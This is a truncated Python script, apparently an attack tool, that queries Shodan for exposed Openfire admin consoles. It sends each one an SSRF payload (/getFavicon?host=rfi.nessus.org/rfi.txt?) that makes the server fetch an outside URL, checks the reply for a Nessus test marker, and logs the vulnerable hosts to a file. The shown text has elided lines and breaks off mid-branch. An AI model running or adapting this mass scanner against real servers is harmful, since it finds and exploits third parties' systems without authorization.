...
#
# openfire.py
# Search SHODAN for openfire SSRF
#
...
# Configuration
API_KEY = "YOURAPIKEY"
SEARCH_FOR = 'title:"Openfire Admin Console"'
FILE = "/getFavicon?host=rfi.nessus.org/rfi.txt?"
...
def grab_file (IP,PORT,FILE):
	...
	try:
		...
		if "TmVzc3VzQ29kZUV4ZWNUZXN0" in response.text:
			text_file = open("openfire.cfg", "a")
			text_file.write(""+URL+"\n")
			text_file.close()
			print ("[*] openfire... Found [*]\n")
			print (result)
		else:
